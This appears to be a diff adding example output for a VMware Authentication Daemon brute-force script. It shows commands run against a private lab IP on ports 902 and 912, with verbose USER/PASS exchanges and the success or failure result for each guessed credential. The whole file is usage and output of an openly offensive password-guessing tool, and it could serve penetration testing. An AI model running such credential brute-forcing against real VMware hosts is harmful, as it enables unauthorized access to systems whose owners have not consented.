@@ -1,0 +1,41 @@
+### Port 902 ###
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 902 -timeout 1 -username User -password password
+Success: User:password
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 902 -timeout 1 -username User -password password -v
+Received: 220 VMware Authentication Daemon Version 1.10: SSL Required, ServerDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported
+Switching to SSL
+Sending: USER User
+Received: 331 Password required for User.
+Sending: PASS password
+Received: 230 User User logged in.
+Success: User:password
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 902 -timeout 1 -username User -password wrongpassword
+Socket error
+Failed: User:wrongpassword
+
+
+
+
+### Port 912 ###
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 912 -timeout 1 -username User -password password
+Success: User:password
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 912 -timeout 1 -username User -password password -v
+Received: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , ,
+Sending: USER User
+Received: 331 Password required for User.
+Sending: PASS password
+Received: 230 User User logged in.
+Success: User:password
+
+# ./vmware-authentication-brute-forcer.py -ip 192.168.20.13 -port 912 -timeout 1 -username User -password wrongpassword -v
+Received: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , ,
+Sending: USER User
+Received: 331 Password required for User.
+Sending: PASS wrongpassword
+timed out
+Failed: User:wrongpassword
